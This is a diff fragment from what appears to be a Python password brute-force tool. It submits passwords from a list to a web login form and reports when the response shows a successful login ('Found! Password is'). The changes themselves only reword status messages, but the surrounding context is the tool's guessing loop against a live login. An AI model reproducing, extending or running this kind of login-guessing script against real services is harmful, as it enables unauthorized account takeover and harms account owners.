@@ -75,18 +75,18 @@ def Main():
                  br.method="POST"
                  res = br.submit()
                  if "home_icon" in res.get_data():
-                     print("[+]~[{}] Trying Password[ {} ]  ==> Yes :)".format(lo,password.strip()))
+                     print("[+]~[{}] Testing Password[ {} ]  ==> Yes :)".format(lo,password.strip()))
                      print ("\n[*] Found! Password is ==> "+ password)
                      break
                  else:
-                     print('[-]~[{}] Testing password[ {} ] ==> No :('.format(lo,password.strip()))
+                     print('[-]~[{}] Testing Password[ {} ] ==> No :('.format(lo,password))
                      lo +=1
              except KeyboardInterrupt:
                  print('\n---------------------------\n[!][CTRL+C] Exiting.....!\n')
                  time.sleep(1.2)
                  exit(1)
      elif check == False:
-         print("\n[!] Please Check Your Internet Connection !!!")
+         print("\n[!] Error: Please Check Your Internet Connection !!!")
          exit(1)
    else:
        print(parse.usage)
